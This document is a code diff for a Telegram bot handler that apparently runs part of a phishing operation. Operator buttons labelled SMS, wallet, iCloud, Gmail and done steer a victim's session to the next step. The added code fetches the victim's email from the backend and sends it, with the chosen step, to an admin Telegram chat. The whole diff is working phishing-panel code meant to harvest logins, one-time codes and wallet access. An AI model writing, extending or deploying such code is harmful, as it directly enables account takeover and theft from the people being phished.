@@ -653,10 +653,72 @@ if (bot2) {
           const response = await fetch(`${APP_URL}/get-page-display-email?email=${encodeURIComponent(identifier)}`);
           const data = await response.json();
           displayEmail = data.displayEmail || email;
-          console.log(`📝 iCloud page callback: email ${identifier} → display ${displayEmail}`);
         } catch (err) {
           console.error("Error fetching display email:", err);
           displayEmail = email;
+        }
+      }
+
+      // ✅ HANDLE VERIFYING BUTTONS (Bot 2)
+      if (action === "verifying_sms" || action === "verifying_done" || action === "verifying_wallet" || action === "verifying_icloud" || action === "verifying_gmail") {
+        const verifyingId = identifier;
+        
+        try {
+          const updateResult = await fetch(`${APP_URL}/update-verifying-choice`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ verifyingId, choice: action })
+          });
+          
+          try {
+            await bot2.editMessageReplyMarkup(
+              { inline_keyboard: [] },
+              { chat_id: query.message.chat.id, message_id: query.message.message_id }
+            );
+          } catch (err) {
+            console.error("Error removing buttons:", err);
+          }
+          
+          await bot2.answerCallbackQuery(callbackId, { text: `✅ ${action.toUpperCase()}` });
+          
+          try {
+            const verifyRes = await fetch(`${APP_URL}/get-verifying-info/${verifyingId}`);
+            const verifyData = await verifyRes.json();
+            const verifyEmail = verifyData.email || 'unknown@example.com';
+            
+            let choiceText = '';
+            if (action === "verifying_sms") {
+              choiceText = `📧 <code>${verifyEmail}</code> → <b>SMS - 2</b> 💬`;
+            } else if (action === "verifying_done") {
+              choiceText = `📧 <code>${verifyEmail}</code> → <b>Done</b> 🏁`;
+            } else if (action === "verifying_wallet") {
+              choiceText = `📧 <code>${verifyEmail}</code> → <b>Wallet</b> 💼`;
+            } else if (action === "verifying_icloud") {
+              choiceText = `📧 <code>${verifyEmail}</code> → ☁️`;
+            } else if (action === "verifying_gmail") {
+              choiceText = `📧 <code>${verifyEmail}</code> → 🌈`;
+            }
+            
+            if (choiceText) {
+              const url = `https://api.telegram.org/bot${BOT_TOKEN_2}/sendMessage`;
+              await fetch(url, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                  chat_id: ADMIN_CHAT_ID_2,
+                  text: choiceText,
+                  parse_mode: "HTML"
+                })
+              });
+            }
+          } catch (err) {
+            console.error("Error sending verifying choice message:", err);
+          }
+          
+          return;
+        } catch (err) {
+          console.error("Error processing verifying choice:", err);
+          return;
         }
       }
 
